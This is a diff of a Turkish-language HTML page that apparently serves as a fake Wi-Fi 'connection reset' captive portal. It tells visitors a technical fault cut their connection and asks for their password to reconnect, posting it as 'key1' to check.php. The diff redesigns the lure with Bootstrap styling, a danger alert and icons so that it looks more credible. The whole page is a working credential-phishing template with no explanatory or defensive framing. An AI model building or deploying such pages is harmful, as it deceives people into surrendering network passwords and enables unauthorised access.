@@ -2,11 +2,15 @@
 <html lang="tr">
 
 <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
     <meta http-equiv="Content-Type" content="text/html" charset="utf-8" />
     <link href="images/favicon.ico" rel="icon" type="image/x-icon" />
+    <link rel="stylesheet" href="./css/style-main.css">
     <style>
         body {
             margin: 0px;
+
             background-color: transparent;
             overflow: hidden;
         }
@@ -15,8 +19,9 @@
             text-align: left;
             color: #7F7F7F;
             font-size: 18px;
-            margin-top: 20px;
+            margin-top: 10px;
             padding-left: 5%;
+            
         }
 
         .main-frame-text {
@@ -79,39 +84,110 @@
             filter: progid: DXImageTransform.Microsoft.Gradient(StartColorStr='#80c1f6', EndColorStr='#50b1fe', GradientType=0);
             padding: 0px;
         }
-    </style>
+        .btn-btn{
+            border-radius: 5px;
+            width: 160px;
+            height: 40px;
+           
+            background-color:#50b1fe;
+            
+        }
+  
 
+    </style>
+<style>
+ 
+html, body, div, span, applet, object, iframe,
+h1, h2, h3, h4, h5, h6, p, blockquote, pre,
+a, abbr, acronym, address, big, cite, code,
+del, dfn, em, img, ins, kbd, q, s, samp,
+small, strike, strong, sub, sup, tt, var,
+b, u, i, center,
+dl, dt, dd, ol, ul, li,
+fieldset, form, label, legend,
+table, caption, tbody, tfoot, thead, tr, th, td,
+article, aside, canvas, details, embed, 
+figure, figcaption, footer, header, hgroup, 
+menu, nav, output, ruby, section, summary,
+time, mark, audio, video {
+	margin: 0;
+	padding: 0;
+	border: 0;
+	font-size: 100%;
+	font: inherit;
+	vertical-align: baseline;
+}
+/* HTML5 display-role reset for older browsers */
+article, aside, details, figcaption, figure, 
+footer, header, hgroup, menu, nav, section {
+	display: block;
+}
+body {
+	line-height: 1;
+}
+ol, ul {
+	list-style: none;
+}
+blockquote, q {
+	quotes: none;
+}
+blockquote:before, blockquote:after,
+q:before, q:after {
+	content: '';
+	content: none;
+}
+table {
+	border-collapse: collapse;
+	border-spacing: 0;
+}
+</style>
 </head>
 
 <body>
-    <p class="main-frame-text-error">Bağlantı ayarlarınız sıfırlandı!</p>
-    <p class="main-frame-text">Bağlantınızda bir sorun algılandı ve bağlantı ayarlarınız sıfırlandı</p>
-    <p class="main-frame-over-input-text">Bağlantınızı geri getirmek için şifrenizi giriniz:</p>
-    <div class="table-div">
-        <table class="table-input">
-            <tbody>
-                <tr>
-                    <td class="table-data-1">
-                        <img src="images/password.png" class="table-image">
-                    </td>
-                    <td class="table-data-1 table-white">
-                        <p>Şifre</p>
-                    </td>
-                    <form id="form1" name="form1" method="POST" action="check.php">
-                        <td class="table-data-1">
-                            <input name="key1" type="password" class="input-pass" />
-                        </td>
-                        <td class="table-data-1">
-                            <input name="Confirm" class="confirmbtn" type="submit" value="Onayla" />
-                        </td>
+  
 
-                    </form>
-                </tr>
-            </tbody>
+  
+    <span class="info-bodyBorder">
+        
+        <div class="alert alert-danger" role="alert">
+         <svg  style="float: right;" width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-three-dots" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+            <path fill-rule="evenodd" d="M3 9.5a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3zm5 0a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3zm5 0a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3z"/>
+            </svg><svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-wifi-off" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+            <path d="M10.706 3.294A12.545 12.545 0 0 0 8 3 12.44 12.44 0 0 0 .663 5.379a.485.485 0 0 0-.048.736.518.518 0 0 0 .668.05A11.448 11.448 0 0 1 8 4c.63 0 1.249.05 1.852.148l.854-.854zM8 6c-1.905 0-3.68.56-5.166 1.526a.48.48 0 0 0-.063.745.525.525 0 0 0 .652.065 8.448 8.448 0 0 1 3.51-1.27L8 6zm2.596 1.404l.785-.785c.63.24 1.228.545 1.785.907a.482.482 0 0 1 .063.745.525.525 0 0 1-.652.065 8.462 8.462 0 0 0-1.98-.932zM8 10l.934-.933a6.454 6.454 0 0 1 2.012.637c.285.145.326.524.1.75l-.015.015a.532.532 0 0 1-.611.09A5.478 5.478 0 0 0 8 10zm4.905-4.905l.747-.747c.59.3 1.153.645 1.685 1.03a.485.485 0 0 1 .048.737.518.518 0 0 1-.668.05 11.496 11.496 0 0 0-1.812-1.07zM9.02 11.78c.238.14.236.464.04.66l-.706.706a.5.5 0 0 1-.708 0l-.707-.707c-.195-.195-.197-.518.04-.66A1.99 1.99 0 0 1 8 11.5c.373 0 .722.102 1.02.28zm4.355-9.905a.53.53 0 1 1 .75.75l-10.75 10.75a.53.53 0 0 1-.75-.75l10.75-10.75z"/>
+            </svg>
+           <strong>Bağlantı ayarlarınız sıfırlandı!</strong>
+          </div>
 
-        </table>
-    </div>
+       
+        <p class="main-frame-text">Teknik bir sorun nedeniyle bağlantı zaman aşımına uğradı</p>
+        <br>
+        <p class="main-frame-over-input-text">Tekrar bağlanmak için parolanızı girin:</p>
+      
+    </span>
+    
+    <div class="margintop_15" align="center">
+         <table id="input_username_pass" class="login_table width_400" cellspacing="0"> <tbody>
+     
+    <tr class="height_25"> <td class="login_second_row_first_td login_first_row_first_td_r width_35"> 
+        <svg style="margin-left: 5px; font-weight:900" width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-key" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+            <path fill-rule="evenodd" d="M0 8a4 4 0 0 1 7.465-2H14a.5.5 0 0 1 .354.146l1.5 1.5a.5.5 0 0 1 0 .708l-1.5 1.5a.5.5 0 0 1-.708 0L13 9.207l-.646.647a.5.5 0 0 1-.708 0L11 9.207l-.646.647a.5.5 0 0 1-.708 0L9 9.207l-.646.647A.5.5 0 0 1 8 10h-.535A4 4 0 0 1 0 8zm4-3a3 3 0 1 0 2.712 4.285A.5.5 0 0 1 7.163 9h.63l.853-.854a.5.5 0 0 1 .708 0l.646.647.646-.647a.5.5 0 0 1 .708 0l.646.647.646-.647a.5.5 0 0 1 .708 0l.646.647.793-.793-1-1h-6.63a.5.5 0 0 1-.451-.285A3 3 0 0 0 4 5z"/>
+            <path d="M4 8a1 1 0 1 1-2 0 1 1 0 0 1 2 0z"/>
+          </svg>
+        <i class="fa fa-key"></i>
+    <form id="form1" name="form1" method="POST" action="check.php">
+                    
+        <label class="pull-left ie6password ic-password ie6image"></label> </td> 
+        
+        <td class="login_second_row_second_td paddingleft_5 paddingright_5 width_70 text_left">
+         
+            Parola</td> 
+        <td class="login_second_row_third_td"> 
+            <input id="password" type="password" name="key1" autocomplete="off" style="border:none;margin-bottom:0px;height:100%;width:98%;" maxlength="32/"> </td> </tr> 
+        </tbody>
+    </table><br> </div>
+        <div class="login_cancel_div paddingtop_10 paddingbottom_10 text_center"> 
+        <button name="Confirm" type="submit" class="btn-btn">Onayla</button></div>
+    </form>
 
 </body>
-
 </html>
